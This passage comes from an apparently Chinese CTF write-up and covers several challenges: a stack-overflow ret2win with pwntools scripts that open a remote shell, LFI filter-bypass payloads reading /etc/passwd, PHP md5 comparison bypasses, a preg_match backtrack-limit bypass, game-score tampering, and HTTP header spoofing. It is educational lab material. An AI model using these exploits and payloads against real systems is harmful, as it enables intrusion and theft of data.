class="keyword">ssize_t</span> __fastcall <span class="title">vuln</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x7FFFFFFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402038);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_40205D);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x8848</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于第一个比较，直接输入-1</li><li>对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">print(<span class="string">&#x27;0x%x&#x27;</span>%sysaddr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(sysaddr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>正常来说这么写没问题，但是运行的时候不会返回shell<br>原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作<br><img src="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" srcset="data:image/png;base64,666" alt="image"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x4012bf</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>坑</strong></p><ul><li>当返回到后门函数行不通的时候，返回到调用system函数的语句</li><li>Windows和Linux平台运行同一份exp的结果可能不同</li></ul><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h2 id="Badbad-filename"><a href="#Badbad-filename" class="headerlink" title="Badbad_filename"></a>Badbad_filename</h2><p><code>GET me a filename and I&#39;ll include it!</code><br>测试一下发现过滤了php、filter、base、data、file等关键字<br>然后就搜一堆绕过的方法</p><ul><li>如果base被绕过了，可以使用url编码convert往后，resource往前的字符<code>?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource=</code></li><li>除了测试文件<code>/etc/passwd</code>之外，如果是nginx，可以考虑读日志<code>/var/log/nginx/access.log</code></li><li>如果读<code>flag.php</code>，记得先访问一下看看页面是否存在</li></ul><p>最后，这道题的解法是最简单的双写绕过<br><code>?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp</code></p><p><code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code></p><p>麻了</p><h2 id="canyoupassit"><a href="#canyoupassit" class="headerlink" title="canyoupassit"></a>canyoupassit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a1&#x27;</span>] != $_POST[<span class="string">&#x27;b1&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a1&#x27;</span>] == md5($_POST[<span class="string">&#x27;b1&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第一关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;就这?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;key&#x27;</span>] == md5($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第二关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;再看看?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">$now = time();  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a2&#x27;</span>] != $_POST[<span class="string">&#x27;b2&#x27;</span>] &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;a2&#x27;</span>], $now) &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;b2&#x27;</span>], $now) &amp;&amp; md5($_POST[<span class="string">&#x27;a2&#x27;</span>] === md5($_POST[<span class="string">&#x27;b2&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第三关!&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;真可惜，就差最后一步了&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道有关md5绕过的题目，主要分为三个部分</p><ol><li>不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞</li><li>md5值等于自身的值（<strong>弱比较</strong>） – 0e绕过</li><li>不同值的md5是一样的（<strong>强比较</strong>），且要求两个值都有特定前缀</li></ol><p>解决的方法如下：</p><ol><li>对于弱比较的md5值，可以直接百度特定的值<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</li></ul></li><li>对于若比较的<code>$a == md5($a)</code>，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如<code>0e215962017</code></li><li>对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用<code>fastcoll</code>工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">int</span>(time.time()+<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(t))</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;fastcoll_v1.0.0.5.exe t.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">b2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30038/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;s214587387a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> : <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>一些要注意的点</p><ul><li>特定前缀的时间最好往后调一调，避免因网络问题导致错过时间</li><li>生成的两个txt需要以二进制的形式读取</li></ul><p><code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code></p><h2 id="Ezgame"><a href="#Ezgame" class="headerlink" title="Ezgame"></a>Ezgame</h2><p>进入是一个小游戏，要求达到非常高的分数</p><p><img src="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026193535.png"></p><p>直接玩肯定不现实，于是翻翻js代码<br>因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数</p><p>入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量<br>翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些<br><img src="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194009.png"></p><p><img src="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194244.png"><br>看起来像是存储游戏角色的变量<br>于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;o1&quot;</span>,<span class="attr">&quot;ownerId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;position&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">359.04999999999956</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">154.2499999999999</span>&#125;,<span class="attr">&quot;size&quot;</span>:&#123;<span class="attr">&quot;width&quot;</span>:<span class="number">32</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">32</span>&#125;,<span class="attr">&quot;direction&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;facing&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;speed&quot;</span>:<span class="number">150</span>,<span class="attr">&quot;team&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;hitPoints&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;damage&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteSheet&quot;</span>:<span class="string">&quot;characters&quot;</span>,<span class="attr">&quot;spriteX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteY&quot;</span>:<span class="number">992</span>,<span class="attr">&quot;spriteAlign&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;animated&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;animFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;animNumFrames&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;animDelay&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;animElapsed&quot;</span>:<span class="number">16</span>,<span class="attr">&quot;spawnFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFrameCount&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;spawnFramesX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFramesY&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;angle&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;rotateSpeed&quot;</span>:<span class="number">400</span>,<span class="attr">&quot;rotate&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;worth&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttlElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;alpha&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;alphaMod&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;gibletSize&quot;</span>:<span class="string">&quot;small&quot;</span>,<span class="attr">&quot;cooldown&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;cooldownElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;autoFire&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;soundAttacks&quot;</span>:<span class="string">&quot;hero_attacks&quot;</span>,<span class="attr">&quot;soundDamage&quot;</span>:<span class="string">&quot;hero_damage&quot;</span>,<span class="attr">&quot;soundDies&quot;</span>:<span class="string">&quot;hero_dies&quot;</span>,<span class="attr">&quot;alive&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;states&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;timer&quot;</span>:&#123;<span class="attr">&quot;elapsed_ms&quot;</span>:<span class="number">43298</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>&#125;&#125;,<span class="literal">null</span>,<span class="literal">null</span>],<span class="attr">&quot;currentWeaponIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;collidable&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;bounce&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;piercing&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;achievementId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;deathsForAchievement&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;ignoreLogDeath&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;damageType&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;drawIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;moveChangeElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;moveChangeDelay&quot;</span>:<span class="number">500</span>,<span class="attr">&quot;wounds&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;weapons&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_sword&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_spear&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="number">82</span>&#125;],<span class="attr">&quot;gold&quot;</span>:<span class="number">1000000000</span>,<span class="attr">&quot;kills&quot;</span>:<span class="number">10000000000</span>,<span class="attr">&quot;timesWounded&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;totalDamageTaken&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;shotsFired&quot;</span>:<span class="number">108</span>,<span class="attr">&quot;shotsLanded&quot;</span>:<span class="number">65</span>,<span class="attr">&quot;shotsPerWeapon&quot;</span>:&#123;<span class="attr">&quot;h_sword&quot;</span>:<span class="number">28</span>,<span class="attr">&quot;h_knife&quot;</span>:<span class="number">31</span>,<span class="attr">&quot;h_spear&quot;</span>:<span class="number">18</span>&#125;,<span class="attr">&quot;meatEaten&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;cheater&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;phase&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;phaseInit&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;lootTable&quot;</span>:[],<span class="attr">&quot;killSwitch&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;isMeatboy&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;bloodTimer&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>然后返回游戏发现数据没有变化<br>以为错了，退出去，然后在主界面发现了flag<br><img src="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194359.png"></p><p><code>flag&#123;basju_D0G006706_iajdisaia&#125;</code></p><h2 id="hardphp"><a href="#hardphp" class="headerlink" title="hardphp"></a>hardphp</h2><p>进入题目什么都没有，只有一句话<code>尝试大声喊出v我50!!!我就会给你flag</code><br>只能扫后台了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~$ dirsearch -u http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.log</span><br><span class="line"></span><br><span class="line">Target: http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">[22:14:33] Starting:</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.orig</span><br><span class="line">[22:14:37] 403 -  225B  - /.htaccess.sample</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.bak1</span><br><span class="line">[22:14:37] 403 -  220B  - /.ht_wsr.txt</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.save</span><br><span class="line">[22:14:37] 403 -  224B  - /.htaccess_extra</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccess_sc</span><br><span class="line">[22:14:38] 403 -  223B  - /.htaccess_orig</span><br><span class="line">[22:14:38] 403 -  214B  - /.html</span><br><span class="line">[22:14:38] 403 -  219B  - /.htpasswds</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessBAK</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessOLD</span><br><span class="line">[22:14:38] 403 -  213B  - /.htm</span><br><span class="line">[22:14:38] 403 -  222B  - /.htaccessOLD2</span><br><span class="line">[22:14:38] 403 -  220B  - /.httr-oauth</span><br><span class="line">[22:14:38] 403 -  223B  - /.htpasswd_test</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php/login/</span><br><span class="line">[22:15:17] 403 -  222B  - /server-status</span><br><span class="line">[22:15:17] 403 -  223B  - /server-status/</span><br><span class="line">[22:15:25] 200 -  825B  - /www.zip</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p> 扫出来三个，其中<a href="http://www.zip是网站的备份/">www.zip是网站的备份</a><br>解压之后发现有个<code>flagflaghhh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">$input = $_POST[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($input)) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (substr($input, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;vme50&quot;</span> <span class="keyword">and</span> substr($input, <span class="number">-1</span>, <span class="number">1</span>) == <span class="string">&quot;!&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> ($input == <span class="string">&quot;vme50!&quot;</span>) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Speak a little louder, I can&#x27;t hear you!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/vme50.+?!/is&#x27;</span>, $input)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xing bu xing a.Speak much louder!&quot;</span>);  </span><br><span class="line">        &#125;        system(<span class="string">&quot;cat /flag&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Bie lai zhan bian!!!&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对传入的a参数有三个条件</p><ol><li><p>以<code>vme50</code>为开头，以感叹号为末尾</p></li><li><p>不可以是<code>vme50</code></p></li><li><p>不可以满足正则表达式<code>/vme50.+?!/is</code>，该正则表达式的意思是匹配以<code>vme50</code>开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败</p></li><li><p><code>/</code>：正则表达式的开始和结束标记。</p></li><li><p><code>vme50</code>：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。</p></li><li><p><code>.</code>：点号（<code>.</code>）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。</p></li><li><p><code>+</code>：加号（<code>+</code>）表示前面的字符（在这个例子中是点号 <code>.</code>）出现一次或多次。</p></li><li><p><code>?</code>：问号（<code>?</code>）在这里与 <code>+</code> 结合使用，表示前面的字符（点号 <code>.</code>）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。</p></li><li><p><code>!</code>：感叹号（<code>!</code>）在这里是一个普通字符，表示匹配文本中包含 <code>!</code> 的部分。</p></li><li><p><code>/is</code>：这是正则表达式的修饰符部分，<code>i</code> 表示不区分大小写，<code>s</code> 表示点号 <code>.</code> 可以匹配任意字符，包括换行符。</p></li></ol><p>仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match<br>但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万<br>所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="comment">#&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;vme50&#x27;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><code>flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125;</code></p><h2 id="KFC"><a href="#KFC" class="headerlink" title="KFC"></a>KFC</h2><blockquote><p> 主要考点：HTTP header各字段的含义及格式</p></blockquote><p>进入题目连接，除了一张无意义的图片之外就是<code>Are you come from localhost?</code><br>猜测修改XFF，即<code>X-Forwarded-For: 127.0.0.1</code></p><p>发包返回<code>Are you jump from KFC&#39;s website?(http:****.cn)</code><br>猜测修改Referer，搜索kfc的网址<code>https://kfcapp.cn/</code>，即<code>Referer: https://kfcapp.cn/</code></p><p>发包返回<code>Have you v me 50?</code><br>这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 26 Oct 2024 17:57:44 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45</span><br><span class="line">X-Powered-By: PHP&#x2F;5.4.45</span><br><span class="line">money: 0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50?</span><br></pre></td></tr></table></figure><p>故猜测在header增加一个money的字段，值为50，即<code>money: 